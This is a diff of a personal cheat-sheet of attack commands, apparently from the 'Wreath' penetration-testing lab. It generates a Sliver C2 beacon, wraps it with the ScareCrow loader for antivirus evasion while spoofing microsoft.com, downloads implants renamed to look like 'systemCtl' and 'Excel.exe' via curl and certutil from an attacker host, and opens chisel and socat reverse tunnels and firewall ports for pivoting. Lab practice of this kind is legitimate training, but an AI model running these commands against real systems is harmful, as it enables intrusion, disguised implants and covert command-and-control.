@@ -22,17 +22,13 @@ generate beacon --http 10.200.96.200:10005 --arch amd64 --os windows --save /hom
 
 /opt/ScareCrow/ScareCrow -I /home/kali/Wreath/GIT-SERV-S.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
-
+# mv to match its parent directory
 
 http -L 10.50.76.121 -l 10005
 
-10.50.76.121 
-8888
-
-
 
 curl http://10.50.76.121/chisel -o chisel
-curl http://10.50.76.121/SILVER -o systemCtl
+curl http://10.50.76.121/systemCtl -o systemCtl
 curl http://10.50.76.121/socatx64.bin -o socat
 curl http://10.50.76.121/Excel.exe -o Excel.exe
 
@@ -45,8 +41,6 @@ nohup ./chisel client 10.50.76.121:10000 R:10001:socks &
 nohup ./chisel client 10.50.76.121:10000 R:127.0.0.1:10002:10.200.84.150:80 &
 # For git-serv reverse shell
 nohup ./chisel client 10.50.76.121:10000 R:10003:socks &
-# For silver beacon
-nohup ./chisel client 10.50.76.121:10000 R:10004:127.0.0.1::socks &
 
 firewall-cmd --zone=public --add-port $PORT/tcp
 
@@ -73,6 +67,9 @@ nohup ./socat tcp-l:10006 tcp:10.50.76.121:10006 &
 nohup python3 -m http.server 8443 &
 
 certutil.exe -urlcache -f -split http://10.200.96.200:8443/Excel.exe -o Excel.exe
+
+netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
+
 
 
 ```
